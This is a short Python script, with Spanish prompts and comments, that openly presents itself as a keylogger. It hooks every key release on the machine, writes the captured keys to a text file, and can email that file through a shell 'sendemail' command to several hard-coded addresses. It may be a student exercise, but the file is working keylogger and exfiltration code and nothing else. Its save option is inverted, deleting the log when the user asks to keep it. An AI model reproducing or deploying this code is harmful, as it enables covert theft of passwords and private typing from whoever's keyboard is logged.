import keyboard
import subprocess
from os import remove

registros = []

def callback(event):
    registros.append(event.name)

def output(text):
    with open('output.txt', 'a') as f:
        f.write(text)

def send_email(sender_email, receiver_email):
    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m 'Se adjunta el archivo de registros' -a output.txt -o tls=no"
    subprocess.run(command, shell=True)



def main():
    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    
    respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
        
    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
        print("Interrumpiendo la ejecución del programa...")
        return
    
    keyboard.on_release(callback)

    print("Telclea Exit en el caso de terminar la ejecución del KeyBoard")
    while True:
        if input() == 'exit':
            print("Terminando la ejecución del programa...")
            break
            
    keyboard.unhook_all()
    
    registro = ",".join(registros)
    output(registro)
    
    if respuesta_email.lower() in ['yes', 'y']:
        sender_email = "PaoPatrol_PJAB@hotmail.com"
        receiver_email = "Paola_VB@ciencias.unam.mx"
        
        send_email(sender_email, receiver_email)
        send_email(sender_email, "britny_brito@ciencias.unam.mx")
        send_email(sender_email, "natanael_pi@ciencias.unam.mx")
        send_email(sender_email, "janet1204@ciencias.unam.mx")

    if respuesta_guardar.lower() in ['yes', 'y']:
        remove('output.txt')

if __name__ == "__main__":
    main()